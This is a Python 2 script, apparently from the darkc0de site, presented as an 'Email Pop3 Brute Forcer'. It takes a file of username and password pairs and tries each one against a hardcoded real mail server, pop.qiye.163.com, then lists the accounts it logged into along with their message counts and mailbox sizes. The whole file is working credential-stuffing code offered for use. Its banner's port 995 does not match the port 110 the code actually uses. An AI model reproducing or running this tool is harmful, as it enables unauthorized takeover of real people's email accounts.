#!usr/bin/python 
#Email Pop3 Brute Forcer 
#http://www.darkc0de.com 
#d3hydr8[at]gmail[dot]com 
#http://www.nxadmin.com 

import threading, time, random, sys, poplib 
from copy import copy 

if len(sys.argv) !=2: 
  print "\n\t   EmailPopBruteForcer v1.0" 
  print "\t   --------------------------------------------------\n" 
  print "\t    Usage: ./qmailpopbrute.py <file>\n" 
  sys.exit(1) 
   
server = "pop.qiye.163.com" 
success = [] 

try: 
    users = open(sys.argv[1], "r").readlines() 
except(IOError): 
    print "[-] Error: Check your file path\n" 
    sys.exit(1) 
   
   
try: 
  pop = poplib.POP3(server,110) 
  welcome = pop.getwelcome() 
  print welcome 
  pop.quit() 
except (poplib.error_proto): 
  welcome = "No Response" 
  pass 

def mailbruteforce(user,value): 
       
  try: 
	print "-"*12 
	 
	print "[+] User:",user,"Password:",value 
	time.sleep(2) 
	pop = poplib.POP3(server,110) 
	pop.user(user) 
	auth = pop.pass_(value) 
	print auth 
	if auth.split(' ')[0]!= "+OK" : 
	  pop.quit() 
	  print "unknown error !" 
	   
	if pop.stat()[1] is None or pop.stat()[1] < 1 : 
	  pop.quit() 
	  print "unknown error !" 
	   
	#print "\t\t\n\nLogin successful:",user, value 
	#print "\t\tMail:",pop.stat()[0],"emails" 
	#print "\t\tSize:",pop.stat()[1],"bytes\n\n" 
	ret = (user,value,pop.stat()[0],pop.stat()[1]) 
	success.append(ret) 
	#print len(success) 
	pop.quit() 
	 
  except: 
	#print "An error occurred:", msg 
	pass 



print "\n\t EmailPopBruteForcer v1.0" 
print "\t   --------------------------------------------------\n" 
print "[+] Server:",server 
print "[+] Port: 995" 
print "[+] Users Loaded:",len(users) 
print "[+] Server response:",welcome,"\n" 
for user in users:
	user = user.replace('\n','')
	user = user.replace('\r','')
	value = user.split('----')
	mailbruteforce(value[0],value[1]) 

print "\t[+] have weakpass :\t",len(success) 
if len(success) >=1: 
  for ret in success: 
    print "\n\n[+] Login successful:",ret[0], ret[1] 
    print "\t[+] Mail:",ret[2],"emails" 
    print "\t[+] Size:",ret[3],"bytes\n" 
print "\n[-] Done"
